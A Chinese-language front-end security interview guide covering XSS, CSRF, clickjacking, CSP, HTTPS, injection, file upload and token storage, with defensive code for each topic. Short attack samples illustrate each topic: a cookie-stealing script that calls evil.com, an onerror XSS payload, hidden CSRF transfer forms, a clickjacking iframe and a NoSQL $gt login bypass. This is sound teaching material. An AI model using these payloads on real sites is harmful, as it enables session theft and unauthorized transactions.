# 前端安全面试指南

## 1. XSS（跨站脚本攻击）

> 面试题：XSS 有哪些类型？如何防御？

**XSS 分类**

| 类型 | 存储位置 | 触发方式 | 危害程度 |
|------|---------|---------|---------|  
| 存储型 XSS | 服务器数据库 | 用户访问包含恶意脚本的页面 | 高（持久化，影响所有用户） |
| 反射型 XSS | URL 参数 | 用户点击恶意链接 | 中（需要诱导点击） |
| DOM 型 XSS | 前端 JS 代码 | 前端直接操作不可信数据到 DOM | 中（不经过服务器） |

**攻击示例**

```javascript
// 存储型 XSS：用户提交评论
// 恶意评论内容：<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
// 其他用户浏览评论页时，脚本执行，cookie 被窃取

// DOM 型 XSS：前端直接使用 URL 参数
// URL: http://example.com?name=<img src=x onerror=alert(1)>
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}`; // 危险！
```

**防御措施**

```javascript
// 1. 输出编码 — HTML 实体编码
function escapeHTML(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (char) => escapeMap[char]);
}

// 2. 使用安全的 DOM API
// 危险
element.innerHTML = userInput;
// 安全
element.textContent = userInput;

// 3. Vue/React 框架默认转义
// Vue 模板中 {{ }} 会自动转义
// 避免使用 v-html 渲染不可信内容
// <div v-html="userInput"></div>  ← 危险

// 4. DOMPurify 清洗富文本
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: ['class'],
});

// 5. HttpOnly Cookie 防止 JS 读取
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## 2. CSRF（跨站请求伪造）

> 面试题：CSRF 的原理是什么？有哪些防御方案？

**攻击原理**

1. 用户登录 A 网站，浏览器保存了 A 的 Cookie
2. 用户访问恶意网站 B
3. B 页面包含一个向 A 发送请求的表单或图片
4. 浏览器自动携带 A 的 Cookie 发送请求
5. A 网站服务器认为是合法请求并执行操作

```html
<!-- 恶意网站的攻击代码 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none">

<!-- 或者自动提交的表单 -->
<form action="https://bank.com/transfer" method="POST" id="hack-form">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack-form').submit();</script>
```

**防御方案**

```javascript
// 1. CSRF Token
// 服务端：生成 token 嵌入页面
// <meta name="csrf-token" content="随机token值">

// 前端：请求时携带 token
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ to: 'friend', amount: 100 }),
});

// 2. SameSite Cookie（最推荐）
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
// Strict: 完全禁止跨站携带（最安全，但从外部链接进来也不带）
// Lax: 允许 GET 导航请求携带（默认值，推荐）
// None: 允许跨站携带（必须配合 Secure）

// 3. 验证 Referer / Origin 头
// 服务端检查请求的 Referer 或 Origin 是否为合法域名

// 4. 双重 Cookie 验证
// 在 Cookie 和请求参数中同时携带 token，服务端对比一致性
```

---

## 3. 点击劫持（Clickjacking）

> 面试题：什么是点击劫持？如何防御？

点击劫持通过透明的 iframe 覆盖在正常页面上，诱导用户点击看似正常的按钮，实际上点击的是 iframe 中的恶意操作。

```html
<!-- 攻击者页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;         /* 完全透明 */
    z-index: 999;
  }
</style>
<button>点击领取红包</button>
<iframe src="https://bank.com/transfer?to=hacker"></iframe>
```

**防御方案**

```javascript
// 1. X-Frame-Options 响应头
// DENY: 禁止任何页面嵌入
// SAMEORIGIN: 只允许同源页面嵌入
// X-Frame-Options: DENY

// 2. CSP frame-ancestors 指令（推荐，更灵活）
// Content-Security-Policy: frame-ancestors 'self' https://trusted.com

// 3. JavaScript 防御（兜底）
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

---

## 4. CSP（内容安全策略）

> 面试题：什么是 CSP？如何配置？

CSP（Content Security Policy）是一组 HTTP 响应头指令，告诉浏览器哪些外部资源可以加载和执行，有效防御 XSS 和数据注入攻击。

```
// 常见 CSP 配置
Content-Security-Policy:
  default-src 'self';                              // 默认只允许同源
  script-src 'self' 'nonce-abc123' https://cdn.example.com;  // JS 来源
  style-src 'self' 'unsafe-inline';                // CSS 来源
  img-src 'self' data: https://img.example.com;    // 图片来源
  font-src 'self' https://fonts.googleapis.com;    // 字体来源
  connect-src 'self' https://api.example.com;      // AJAX/WebSocket 来源
  frame-src 'none';                                // 禁止 iframe
  object-src 'none';                               // 禁止 Flash 等插件
  base-uri 'self';                                 // 限制 <base> 标签
  form-action 'self';                              // 限制表单提交目标
  upgrade-insecure-requests;                       // HTTP 自动升级 HTTPS
```

```html
<!-- nonce 方式允许内联脚本（每次请求生成不同 nonce） -->
<script nonce="abc123">
  // 这个脚本被允许执行，因为 nonce 匹配
  console.log('Hello');
</script>

<!-- 没有正确 nonce 的脚本会被阻止 -->
<script>
  // 这个会被 CSP 阻止
  alert('blocked');
</script>
```

**CSP 报告模式**

```
// 仅报告，不阻止（用于灰度测试 CSP 策略）
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;
```

---

## 5. HTTPS 与中间人攻击

> 面试题：HTTPS 的加密过程是怎样的？如何防御中间人攻击？

**TLS 握手过程（简化）**

1. 客户端发送 Client Hello（支持的加密套件列表、随机数 A）
2. 服务端返回 Server Hello（选定的加密套件、随机数 B、数字证书）
3. 客户端验证证书（CA 签名链、有效期、域名匹配）
4. 客户端生成预主密钥（Pre-Master Secret），用服务端公钥加密发送
5. 双方根据随机数 A + 随机数 B + 预主密钥生成对称密钥
6. 后续通信使用对称密钥加密

**防御中间人攻击（MITM）**

```
// 1. HSTS（HTTP Strict Transport Security）
// 强制浏览器使用 HTTPS，防止 SSL 剥离攻击
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// 2. 证书固定（Certificate Pinning）— 已被废弃，不推荐
// 现代替代方案：Certificate Transparency（CT）

// 3. HPKP（HTTP Public Key Pinning）— 已被废弃
// 被 Expect-CT 和 CT Log 机制取代
```

**前端 HTTPS 注意事项**

- 避免混合内容（Mixed Content）：HTTPS 页面加载 HTTP 资源会被阻止或警告
- 使用 `upgrade-insecure-requests` CSP 指令自动升级
- API 请求也必须走 HTTPS
- WebSocket 使用 `wss://` 而非 `ws://`

---

## 6. SQL 注入与 NoSQL 注入

> 面试题：前端如何防范注入攻击？

虽然 SQL 注入主要在后端防御，但前端也有责任做好输入校验。

```javascript
// 前端输入校验（仅作为第一道防线，不能替代后端校验）
function validateInput(input) {
  // 1. 长度限制
  if (input.length > 200) return false;

  // 2. 类型检查
  if (typeof input !== 'string') return false;

  // 3. 特殊字符过滤（白名单策略优于黑名单）
  const allowedPattern = /^[a-zA-Z0-9\u4e00-\u9fa5\s@._-]+$/;
  return allowedPattern.test(input);
}

// NoSQL 注入防御
// 危险：直接将用户输入用于 MongoDB 查询
// POST /api/login
// body: { "username": {"$gt": ""}, "password": {"$gt": ""} }
// 这会匹配所有用户

// 防御：严格校验输入类型
function sanitizeMongoQuery(input) {
  if (typeof input !== 'string') {
    throw new Error('Invalid input type');
  }
  return input;
}
```

---

## 7. 文件上传安全

> 面试题：文件上传有哪些安全风险？如何防御？

```javascript
// 前端文件上传校验
function validateFile(file) {
  // 1. 文件类型校验（MIME type + 扩展名）
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

  if (!allowedTypes.includes(file.type)) {
    throw new Error('不支持的文件类型');
  }

  const ext = '.' + file.name.split('.').pop().toLowerCase();
  if (!allowedExts.includes(ext)) {
    throw new Error('不支持的文件扩展名');
  }

  // 2. 文件大小限制
  const maxSize = 5 * 1024 * 1024; // 5MB
  if (file.size > maxSize) {
    throw new Error('文件大小超过限制');
  }

  // 3. 文件头魔数校验（更可靠的类型检测）
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      const arr = new Uint8Array(e.target.result).subarray(0, 4);
      let header = '';
      for (let i = 0; i < arr.length; i++) {
        header += arr[i].toString(16).padStart(2, '0');
      }
      const validHeaders = {
        'ffd8ffe0': 'image/jpeg',
        'ffd8ffe1': 'image/jpeg',
        'ffd8ffe2': 'image/jpeg',
        '89504e47': 'image/png',
        '47494638': 'image/gif',
      };
      if (!validHeaders[header]) {
        reject(new Error('文件内容与类型不匹配'));
      }
      resolve(true);
    };
    reader.readAsArrayBuffer(file.slice(0, 4));
  });
}
```

**文件上传安全清单**

| 防御层 | 措施 |
|--------|------|
| 前端 | 文件类型、大小、魔数校验 |
| 后端 | 二次校验类型，重命名文件，限制上传目录执行权限 |
| 存储 | 使用独立存储域名（防止同源 XSS），不允许直接访问原文件 |
| 传输 | HTTPS 加密传输 |

---

## 8. 敏感信息保护

> 面试题：前端如何保护敏感信息？Token 应该存储在哪里？

**Token 存储方案对比**

| 存储位置 | XSS 风险 | CSRF 风险 | 说明 |
|---------|---------|----------|------|
| localStorage | 高（JS 可读取） | 无 | 不推荐存储敏感 Token |
| sessionStorage | 高（JS 可读取） | 无 | 标签页关闭即清除 |
| Cookie（HttpOnly） | 低（JS 不可读） | 有 | 推荐，配合 CSRF 防御 |
| 内存变量 | 低 | 无 | 刷新丢失，适合短期 |

```javascript
// 推荐方案：HttpOnly Cookie 存储 Token
// 后端设置
// Set-Cookie: access_token=xxx; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

// 前端：Token 自动随请求发送，无需手动处理
fetch('/api/data', {
  credentials: 'include', // 携带 Cookie
});

// 如果必须用 localStorage（如 SPA + 第三方 API）
// 1. Token 分段存储
// 2. 加密存储
// 3. 设置合理的过期时间
// 4. 敏感操作前二次验证

// 敏感信息加密存储示例
const encoder = new TextEncoder();
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  true,
  ['encrypt', 'decrypt']
);

async function encryptData(data) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(JSON.stringify(data))
  );
  return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
}
```

**前端敏感信息保护清单**

1. **不在前端代码中硬编码密钥、API Key**：使用环境变量或后端代理
2. **不在 URL 中传递敏感信息**：Query 参数会被记录在浏览器历史和服务器日志
3. **表单自动填充控制**：`autocomplete="off"` 或 `autocomplete="new-password"`
4. **防止调试和源码泄露**：生产环境移除 Source Map，代码混淆
5. **接口数据脱敏**：手机号、身份证号在前端展示时进行遮罩处理
6. **安全退出**：清除本地存储的 Token 和缓存数据

```javascript
// 安全退出实现
function secureLogout() {
  // 1. 调用后端注销接口（使 Token 失效）
  fetch('/api/logout', { method: 'POST', credentials: 'include' });

  // 2. 清除本地存储
  localStorage.clear();
  sessionStorage.clear();

  // 3. 清除 Cookie（如果能通过 JS 访问的非 HttpOnly Cookie）
  document.cookie.split(';').forEach((cookie) => {
    const name = cookie.split('=')[0].trim();
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
  });

  // 4. 重定向到登录页
  window.location.href = '/login';
}
```
